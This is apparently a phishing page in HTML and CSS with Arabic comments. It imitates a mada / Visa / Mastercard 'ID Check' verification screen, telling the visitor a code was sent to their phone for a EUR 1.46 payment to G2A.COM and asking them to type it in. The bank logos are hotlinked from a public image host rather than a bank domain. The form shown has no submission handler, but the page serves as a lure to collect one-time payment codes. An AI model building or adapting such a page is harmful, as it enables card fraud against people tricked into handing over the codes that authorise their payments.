<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 20px;
            color: #000;
        }

        .container {
            max-width: 480px;
            margin: 0 auto;
        }

        /* شريط التحكم العلوي */
        .top-nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
        }

        .back-icon {
            color: #0000FF;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        .cancel-label {
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
        }

        /* الشعارات - تم تكبيرها بشكل ملحوظ */
        .header-section {
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
            margin-bottom: 15px;
        }

        .mada-brand img {
            height: 60px; /* حجم كبير جداً وواضح */
            width: auto;
            display: block;
        }

        .cards-brand {
            text-align: right;
        }

        .cards-brand img {
            height: 45px; /* حجم كبير للفيزا والماستركارد */
            width: auto;
            display: block;
            margin-left: auto;
        }

        .id-check-text {
            font-size: 12px;
            color: #333;
            margin-top: 5px;
            font-weight: 500;
        }

        hr {
            border: 0;
            border-top: 1.5px solid #ebebeb;
            margin: 15px 0 30px 0;
        }

        /* العناوين والنصوص */
        h1 {
            font-family: "Times New Roman", Times, serif;
            font-size: 26px;
            font-weight: bold;
            margin: 0 0 25px 0;
        }

        p {
            font-size: 17px;
            line-height: 1.5;
            margin-bottom: 22px;
        }

        /* منطقة الإدخال والزر */
        .auth-form {
            text-align: center;
            margin-top: 50px;
        }

        .label-gray {
            display: block;
            font-size: 15px;
            color: #707070;
            margin-bottom: 12px;
        }

        input[type="text"] {
            width: 100%;
            max-width: 340px;
            height: 55px;
            border: 1px solid #b4b4b4;
            border-radius: 4px;
            font-size: 22px;
            text-align: center;
            margin-bottom: 30px;
            outline: none;
        }

        .btn-submit {
            width: 100%;
            background-color: #0000FF;
            color: white;
            border: none;
            padding: 16px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            letter-spacing: 1px;
        }

        .resend-btn {
            display: block;
            margin-top: 40px;
            color: #0000FF;
            text-decoration: none;
            font-weight: bold;
            font-size: 16px;
            margin-bottom: 60px;
        }

        /* الروابط السفلية */
        .footer-items {
            border-top: 1px solid #f0f0f0;
        }

        .item-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: #00008B;
            text-decoration: none;
            font-size: 16px;
            padding: 18px 0;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="top-nav">
        <div class="back-icon">&#10094;</div>
        <div class="cancel-label">Cancel</div>
    </div>

    <div class="header-section">
        <div class="mada-brand">
            <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" alt="mada logo">
        </div>
        <div class="cards-brand">
            <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" alt="Visa Mastercard">
            <div class="id-check-text">ID Check</div>
        </div>
    </div>

    <hr>

    <h1>Verify By Phone</h1>

    <p>We have sent you a text message with a code to your registered mobile number.</p>
    
    <p>You are paying <strong>G2A.COM</strong> the amount of <strong>EUR 1.46</strong> on 2026/02/15 01:54:11.</p>

    <div class="auth-form">
        <label class="label-gray">Verification code</label>
        <input type="text" autocomplete="off">
        <button class="btn-submit">CONFIRM</button>
        <a href="#" class="resend-btn">RESEND CODE</a>
    </div>

    <div class="footer-items">
        <a href="#" class="item-row">
            Learn more about authentication <span>+</span>
        </a>
        <a href="#" class="item-row">
            Need some help ? <span>+</span>
        </a>
    </div>
</div>

</body>
</html>
